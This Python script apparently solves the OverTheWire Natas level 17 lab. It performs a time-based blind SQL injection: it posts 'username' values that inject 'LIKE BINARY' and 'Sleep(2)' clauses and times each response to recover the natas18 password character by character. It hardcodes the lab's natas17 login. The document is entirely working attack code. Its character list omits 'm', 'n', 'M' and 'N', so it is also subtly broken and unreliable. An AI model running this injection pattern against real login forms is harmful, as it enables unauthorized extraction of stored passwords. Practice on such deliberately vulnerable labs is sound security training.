# exploit.

import requests
from requests.auth import HTTPBasicAuth
from timeit import default_timer as timer

characters = 'abcdefghijklopqrstuvwxyzABCDEFGHIJKLOPQRSTUVWXYZ0123456789'
auth_info = HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')

# username_value = 'natas18" AND password LIKE BINARY "' + password + char + '%" AND sleep(2) #'

password = ''
username_value = ''
data = {"username":username_value}

for i in range(0,32):
    for character in characters:
        data["username"] = ''
        data["username"] += 'natas18" AND password LIKE BINARY "'
        data["username"] += password
        data["username"] += character
        data["username"] += '%" AND Sleep(2); #'
        
        start = timer()
        r = requests.post('http://natas17.natas.labs.overthewire.org/', auth = auth_info, data = data)
        end = timer()
        diff = end-start
        if diff > 2: # means we have a valid character
            password += character
            print("[-] Found -> " + str(password))
print("[*] The password for natas18 is: " + str(password))
print("[*] Done.")      

